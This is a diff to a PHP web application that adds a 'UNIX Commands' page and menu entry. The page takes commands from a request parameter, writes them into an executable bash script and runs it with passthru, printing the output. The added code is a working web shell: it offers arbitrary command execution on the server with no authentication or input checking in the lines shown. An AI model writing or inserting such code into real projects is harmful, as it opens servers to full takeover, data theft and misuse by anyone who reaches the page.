@@ -104,6 +104,46 @@
     }
   }
 
+//*************************************************************************************************
+// CMD section
+//************************************************************************************************* 
+
+  function write_script($fsp, $text)
+  {
+    $array = split("\n",$text);
+    $out = fopen($fsp, "w");
+    fwrite($out,'#!/bin/bash'."\n");
+    fwrite($out,'cd ..'."\n");
+    foreach ($array as $line)
+      if (!empty($line))
+      {
+        fwrite($out, "echo '<hr noshade size=1><font color=red>".trim($line)."</font><hr size=1 noshade>'\n");
+        fwrite($out, trim($line)."\n" );
+      }
+    fclose($out);
+    chmod($fsp,0755);
+  }
+  
+  function cmd_display()
+  {
+    set_time_limit(86400); 
+    $cmd = un_magic_quote($_REQUEST["cmd"]);
+  
+    echo '<p><h1>Enter UNIX Commands<p>';
+    message($new);
+    form_start('index.php');
+    form_hidden('section','CMD');
+    form_hidden('action','DISPLAY');
+    form_text('cmd','Command',70,5,$cmd);
+    form_submit('Run Commands',1);
+    form_end();
+
+    echo '<p><h1>Output<p></h1><pre>';
+    write_script("_script.sh",$cmd);
+    passthru('/bin/bash _script.sh 2>&1');
+    echo '</pre>';
+  }
+  
   //*************************************************************************************************
   // Populate main sections of the webpage
   //*************************************************************************************************
@@ -116,6 +156,7 @@
  {
    echo '<table width="160">';
    menu_item('Messages','section=MESG&action=DISPLAY');
+   menu_item('UNIX Commands','section=CMD&action=DISPLAY');
    echo '</table>';
  }
  
@@ -133,8 +174,7 @@
    else 
      mesg_display();
  }
-
- 
+  
 //*************************************************************************************************
 // Get the database parameters from the ini file as they are needed throughout the script, and 
 // then execute the template file
